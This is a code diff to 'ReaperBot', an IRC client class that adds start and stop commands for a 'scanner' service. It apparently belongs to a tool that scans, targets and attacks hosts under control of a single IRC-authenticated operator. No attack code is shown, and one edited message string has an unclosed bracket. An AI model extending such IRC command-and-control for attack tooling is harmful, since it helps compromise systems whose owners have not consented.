@@ -51,12 +51,19 @@ class ReaperBot(irc.IRCClient):
 
         if self.command[0] == "help":
             self.display_help()
+            return
 
         if self.command[0] == "status":
             self.display_status()
+            return
 
         if self.command[0] == "start":
             self.start()
+            return
+
+        if self.command[0] == "stop":
+            self.stop()
+            return
 
     # Handles the authentication of a user.
     # Only one user can be authenticated, and is therefor able to issue commands
@@ -72,6 +79,9 @@ class ReaperBot(irc.IRCClient):
     def display_help(self):
         self.msg(self.channel, "The following commands are possible:")
         self.msg(self.channel, "status   | Displays the status of the scanner, targeter and attacker")
+        self.msg(self.channel, "start <service>   | Starts <service> where <service> is [scanner]")
+        self.msg(self.channel, "stop <service>    | Stops <service> where <service> is [scanner]")
+
         return
 
     def display_status(self):
@@ -103,15 +113,27 @@ class ReaperBot(irc.IRCClient):
 
     def start(self):
         if len(self.command) != 2:
-            self.msg(self.channel, "[!] missing operand [scanner | targeter | attacker]")
+            self.msg(self.channel, "[!] missing operand [scanner")
             return
 
         if self.command[1] == "scanner":
-            if self.neofite.is_scanner_running():
+            if not self.neofite.start_scanner():
                 self.msg(self.channel, "[!] scanner already started")
             else:
-                self.neofite.start_scanner()
                 self.msg(self.channel, "[+] scanner started")
+            return
+
+    def stop(self):
+        if len(self.command) != 2:
+            self.msg(self.channel, "[!] missing operand [scanner]")
+            return
+
+        if self.command[1] == "scanner":
+            if not self.neofite.is_scanner_running():
+                self.msg(self.channel, "[!] scanner is already stopped")
+            else:
+                self.neofite.stop_scanner()
+                self.msg(self.channel, "[+] scanner stopped")
             return
 
 class BotFactory(protocol.ClientFactory):
